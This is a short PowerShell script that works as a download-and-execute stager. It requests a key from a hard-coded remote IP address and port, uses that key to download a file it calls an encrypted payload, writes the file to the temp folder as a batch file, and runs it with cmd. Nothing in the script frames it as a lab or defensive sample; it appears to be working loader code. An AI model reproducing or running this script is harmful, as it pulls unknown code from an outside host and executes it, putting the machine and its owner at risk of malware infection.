$ErrorActionPreference = "Stop"

Write-Host "[INFO] ===== START ====="

$BASE = "http://82.29.153.101:8080"
$FILE = "$env:TEMP\sc.bat"

# ===== TS =====
$TS = [int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
Write-Host "[DEBUG] TS=$TS"

# ===== KEY =====
Write-Host "[INFO] Requesting KEY..."
$KEY = Invoke-RestMethod "$BASE/auth/key?ts=$TS"

if (-not $KEY) {
    Write-Host "[ERROR] KEY vacía"
    exit 1
}

Write-Host "[DEBUG] KEY=$KEY"

# ===== PAYLOAD =====
Write-Host "[INFO] Downloading payload..."
Invoke-WebRequest "$BASE/payload/encrypted" `
    -Headers @{ "X-Decrypt-Key" = "$KEY" } `
    -OutFile $FILE

if (!(Test-Path $FILE)) {
    Write-Host "[ERROR] Payload no descargado"
    exit 1
}

if ((Get-Item $FILE).Length -eq 0) {
    Write-Host "[ERROR] Payload vacío"
    exit 1
}

Write-Host "[DEBUG] Payload:"
Get-Content $FILE

# ===== EXEC =====
Write-Host "[INFO] Ejecutando payload..."
cmd /c $FILE

Write-Host "[INFO] Exit code: $LASTEXITCODE"
Write-Host "[INFO] ===== END ====="